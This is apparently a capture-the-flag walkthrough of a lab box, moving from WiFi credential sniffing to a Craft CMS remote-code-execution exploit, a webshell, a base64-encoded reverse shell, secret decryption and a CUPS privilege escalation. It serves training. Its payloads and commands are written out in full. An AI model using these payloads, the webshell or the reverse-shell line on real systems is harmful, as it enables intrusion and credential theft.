# Layover

![](images/Layover.webp)

**Difficulty:** Medium  
**OS:** Linux  
**Author:** M1mix

---

## Overview

Layover simulates a real-world airport IT workstation scenario. Starting with a single set of credentials, we'll sniff a captive WiFi portal out of the air, hijack a Craft CMS admin panel into full RCE, crack an encrypted database password, and finally ride a CUPS race condition all the way to root. Buckle up — this is a long layover with a lot of connecting flights.

**CVEs covered:**

- `CVE-2026-28695` / `GHSA-qrgm-p9w5-rrfw` — Craft CMS authenticated behavior-injection RCE
- `CVE-2026-34990` — CUPS 2.4.16 local printer race condition privilege escalation

---

## Machine Information

As is common in real-life pentests, you will start the Layover box with credentials for the following account:

```
user: contractor
password: Contractor2026!
```

---

## Let's Walk Through

First, an Nmap scan revealed the standard HTB port set:

```bash
nmap -sV -sC <TARGET_IP>
```

![](images/recon.webp)

Now we can see the open ports:

```
22/tcp      open     ssh
3389/tcp    open     ms-wbt-server(RDP)
```

---

Now let's try `22/tcp` SSH with the credentials provided in the question:

```bash
ssh contractor@<TARGET_IP>
```

![](images/ssh.webp)

Ahhh, permission denied. So much for the easy route — these credentials clearly aren't for SSH. So let's try `3389/tcp ms-wbt-server`. What even is that?

`3389/tcp` is RDP (Remote Desktop Protocol), used for remote graphical access to a Windows or Linux machine. (ms-wbt-server indicates Microsoft Remote Desktop Services.)

So how can we connect via RDP?

`FreeRDP` is an open-source RDP client used to remotely connect to a Windows or Linux machine via RDP.

<p align="center"><img src="images/FreeRDP.webp" width="200" alt="FreeRDP logo"></p>

This is the command to use `FreeRDP`:

```bash
xfreerdp3 /v:<TARGET_IP> /u:contractor /p:'Contractor2026!' /cert:ignore /dynamic-resolution
```

command:

- `/v` — target IP
- `/u` — username
- `/p` — password
- `/cert:ignore` — skip SSL certificate verification
- `/dynamic-resolution` — allow window resize

It will pop up the Remote Desktop Service.

![](images/initRDP.webp)

Now that we're logged in as contractor, you can try things yourself first before I give my walkthrough suggestion.

The first thing I do is try to find the root folder.

![](images/findroot.webp)

Then I check the privileges for contractor using:

```bash
sudo -l
```

![](images/sudo-l.webp)

OK, now we know contractor can run every command on this machine, so let's log in as root with:

```bash
sudo su -
```

![](images/root.webp)

Now that we have root access, let's look inside /root.

![](images/rootpath.webp)

....ummmm, interesting — the flag isn't here. Root with no flag? That's a plot twist. What should I do next?

...OK, what if I open a browser?

![](images/wifi_home.webp)

It automatically redirects me to http://wifi.international.htb/. And what if I click "Accept & continue to airport portal"?

![](images/wifi_loading.webp)

Why is it loading for so long????

![](images/portal_unload.webp)

....What the fxxxxx..........

> **Hint 1:** On the top right of the sidebar, you will see the WiFi logo.

Ohhh, I forgot to connect to the WiFi. Rookie mistake.

![](images/wifi_connect.webp)

Let's try again.

![](images/portal_home.webp)

Great. After I check all the information provided here, there's nothing, so let's try "Sign in Miles".

![](images/wifi_login.webp)

After logging in to the system, we see that we only have a blue member, and there's still no user flag here.

![](images/portal_login.webp)

_You can try to log in, but every username and password logs in as a blue member._

---

> **Hint 2:** On the WiFi, we notice that there's `wlan2` and `wlan3`. So what are they? How do they differ?

Let me explain clearly:

`wlan2` is our client interface — already connected to HTB International WiFi on channel 6, used for normal communication with the network.

`wlan3` is our monitor interface — a second wireless adapter that we can place into monitor mode to passively capture all wireless frames flying over channel 6, including traffic from other clients on the same network.

---

![](images/wlan3.webp)

So now let's connect `wlan3` and check the config of `wlan2` and `wlan3` using:

```bash
iw dev
```

![](images/config.webp)

After we see the config of `wlan2` and `wlan3`, how do we see the traffic on `wlan3`? (I found that the machine has Wireshark.)

![](images/wireshark.webp)

Now open it.

![](images/wireshark_open.webp)

So now we want to capture the traffic on wlan3, so we select wlan3.

![](images/wlan3_notconnect.webp)

....why isn't there any traffic on wlan3? What did I forget?

---

> **Hint 3:** Because in the wlan config, wlan3 isn't in monitor type yet. To set it up, we use:

```bash
ip link set wlan3 down
iw dev wlan3 set type monitor
ip link set wlan3 up
iw dev wlan3 set channel 6
```

![](images/config_after.webp)

After we change `wlan3` from managed to monitor type, go to Wireshark again.

![](images/wlan3_home.webp)

Open it and capture the network traffic.

![](images/wlan3_traffic.webp)

After starting the capture, you can just chill, grab a coffee, and wait 2-3 minutes, then stop it.

![](images/wlan3_end.webp)

OMG! That's way too many lines — how am I supposed to find someone logging in among all this noise? Time to narrow it down. In the filter, you can use:

```bash
http
```

![](images/http_filter.webp)

OK, now you'll see that someone `POST`s their credentials to log in to the system.

![](images/gold_user.webp)

Oh, we got someone's credentials — maybe they have more privileges than a blue member.

```bash
jenny
Fl1ghtDeck2026!
```

Now let's try to log in with these credentials.

![](images/gold_member.webp)

WOW, we just got upgraded to gold member! These credentials carry way more privileges than our humble blue membership.

Now, full honesty — I was stuck here for 1-2 hours before I caved and asked AI for a nudge.

The AI told me I could try random endpoints and check the headers, as they might reveal something. So I tried some endpoints and accidentally discovered `Craft CMS`:

```bash
curl -sI http://portal.international.htb/robots.txt
```

![](images/CMS_header.webp)

Now that we know the portal runs Craft CMS, how do we get into it? I searched "Craft CMS default admin endpoint" and found that Craft ships with its control panel at `/admin` out of the box. So let's navigate to `http://portal.international.htb/admin/login`.

---

So I try to log in using jenny's credentials.

![](images/admin_login.webp)

We're in! After logging in, it redirects to the admin dashboard — but you'll notice the dashboard doesn't fetch any data.

![](images/admin_dashboard.webp)

Oh no, what now? On the top left, I click the menu and select Utilities, where I find the System Report — a goldmine that spills all the system information.

![](images/system_info.webp)

---

## Craft CMS RCE (CVE-2026-28695)

The System Report reveals **Craft CMS 5.9.8** — vulnerable to a behavior-injection RCE via `GHSA-qrgm-p9w5-rrfw`.

The vulnerability abuses Yii's dynamic object configuration. By sending a crafted JSON body to `/index.php?p=admin/actions/element-search/search`, an authenticated user can attach a malicious `yii\behaviors\AttributeTypecastBehavior` with an arbitrary command as `typecastBeforeSave`, which executes during model initialization.

**Step 1:** Prepare a webshell and serve it from airside-ws01 (which shares the `10.13.37.x` subnet with the portal):

```bash
# On the RDP terminal, follow these steps:
touch /tmp/shell.php
vim /tmp/shell.php
# Write this webshell into /tmp/shell.php.
# Before pasting the PHP into vim, press i to enter --INSERT-- mode, then paste it:
<?php system($_GET['cmd']); ?>
# When you're done, press Esc, type :wq, and hit Enter.
cd /tmp && python3 -m http.server 8000
```

![](images/php_rs.webp)

**Step 2:** Open the browser console on the RDP session (logged into Craft as jenny), type `allow pasting`, then execute:

```javascript
// On console in chrome devtools
(async () => {
  const csrf = window.Craft.csrfTokenValue;
  const fire = (cmd) => {
    const b = {
      elementType: "craft\\elements\\Category",
      siteId: 1,
      search: "",
      condition: {
        class: "craft\\elements\\conditions\\ElementCondition",
        elementType: "craft\\elements\\Category",
        fieldLayouts: [
          {
            "as rce": {
              __class: "yii\\behaviors\\AttributeTypecastBehavior",
              "__construct()": [
                {
                  attributeTypes: {
                    typecastBeforeSave: [
                      "Psy\\Readline\\Hoa\\ConsoleProcessus",
                      "execute",
                    ],
                  },
                  typecastBeforeSave: cmd,
                },
              ],
            },
            "on *": "self::beforeSave",
          },
        ],
      },
    };
    const url = "/index.php?p=admin/actions/element-search/search";
    const t0 = performance.now();
    return fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
        "X-CSRF-Token": csrf,
      },
      body: JSON.stringify(b),
    }).then((r) =>
      r.text().then((t) => ({
        status: r.status,
        ms: Math.round(performance.now() - t0),
        head: t.slice(0, 60),
      })),
    );
  };
  const timed = await fire(
    "curl http://10.13.37.182:8000/shell.php --output /var/www/portal/web/index.php",
  );
  return JSON.stringify({ timed });
})();
```

The portal server fetches `shell.php` from airside-ws01 and overwrites `index.php`.

![](images/script_payload.webp)

After you press Enter, you'll get a status 500 error — don't panic, that's expected.

![](images/post_error.webp)

If you flip back to your HTTP server, you'll see `GET /shell.php HTTP/1.1 200` — the portal just phoned home and grabbed our shell.

![](images/http_200.webp)

That means our webshell should be live now.

**Step 3:** Let's verify the RCE:

```bash
curl "http://10.13.37.10/index.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![](images/success_rce.webp)

---

## Reverse Shell

A webshell is nice, but let's upgrade to a proper interactive reverse shell.

On the RDP machine, we spawn two terminals:

```bash
# Terminal 1
nc -lvnp 4444

# Terminal 2
curl "http://10.13.37.10/index.php?cmd=echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMy4zNy4xODIvNDQ0NCAwPiYxCg%3D%3D%7Cbase64%20-d%7Cbash"
```

![](images/netcat.webp)

Terminal 1 uses netcat to listen for the incoming connection.

![](images/payload.webp)

Once you curl the payload in Terminal 2, watch your `nc -lvnp 4444` terminal — something magical happens.

![](images/www_data.webp)

And there it is — a shell as `www-data` on the portal server.

---

## Database Credentials & Password Decryption

Read the Craft `.env` file:

```bash
cat /var/www/portal/.env
# CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
# CRAFT_DB_USER=craftuser
# CRAFT_DB_PASSWORD=CraftDB_pw_2026
```

![](images/env.webp)

Now let's query the custom settings table:

```bash
mysql -h127.0.0.1 -ucraftuser -pCraftDB_pw_2026 craft \
  -e "SELECT * FROM htbairways_settings;"
```

![](images/relaypass.webp)

The `mailRelayPassword` field contains an encrypted blob. Copy the value from the query output above and decrypt it using Craft's own Yii Security class with the key from `.env` (paste the blob into the `$blob` variable below):

```bash
php -r '
require "/var/www/portal/vendor/autoload.php";
$s = new yii\base\Security();
$key = "IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr";
$blob = "<paste the mailRelayPassword value here>";
echo $s->decryptByKey(base64_decode($blob), $key), "\n";'
```

![](images/decrypt.webp)

**Decrypted password:** `Skyp0rt_Relay!26`

The DB also reveals the mail relay user is `aporter`. Now we have a real user and a real password — let's SSH in properly.

---

## User Flag

```bash
ssh aporter@portal.international.htb
# password: Skyp0rt_Relay!26
```

![](images/user_flag.webp)

And just like that, the user flag is ours.

---

## Privilege Escalation — CUPS 2.4.16 (CVE-2026-34990)

```bash
cups-config --version
# 2.4.16
```

CUPS 2.4.16 is vulnerable to a race condition in local printer handling. By creating a printer with `device-uri = file:///etc/sudoers.d/aporter` and racing the print job dispatch before CUPS validates sharing permissions, we can write arbitrary content to a root-owned file.

The exploit:

1. Captures a Local auth token by standing up a fake IPP server and luring CUPS to connect via `ipptool`
2. Creates a `file://` printer pointing at `/etc/sudoers.d/aporter`
3. Races `ADD_MODIFY_PRINTER` → `ACCEPT_JOBS` → `RESUME_PRINTER` → `PRINT_JOB` across 12 attempts until the file is written

**PoC:** https://github.com/0xc4rc4l/CVE-2026-34990-poc/blob/main/exploit.py

Grab the exploit from the PoC above and drop it into `/tmp/exploit.py`:

```bash
touch /tmp/exploit.py
vim /tmp/exploit.py
python3 /tmp/exploit.py
```

![](images/exploit_script.webp)

Heads up: this is a race condition, so it won't always win on the first try. If you don't land root, just run the exploit again — and again — until it hits. A little latency means a little patience.

![](images/root_access.webp)

Once the sudoers file is written:

```bash
sudo -n /bin/bash
```

---

## Root Flag

```bash
cd ~
ls
cat root.txt
```

![](images/root_flag.webp)

Root flag captured — our layover is officially over. Wheels up!

---

## Summary

| Step                 | Technique                                            |
| -------------------- | ---------------------------------------------------- |
| Initial access       | Given credentials via RDP/SSH                        |
| Credential discovery | Monitor-mode WiFi sniffing with Wireshark            |
| Foothold             | Craft CMS behavior-injection RCE (CVE-2026-28695)    |
| Lateral movement     | Yii Security key decryption of DB password           |
| Privilege escalation | CUPS race condition → sudoers write (CVE-2026-34990) |

Thanks for reading — this is the very first writeup I've ever made! If you spot any mistakes, feel free to open an issue on GitHub and I'll get back to you. Happy hacking!
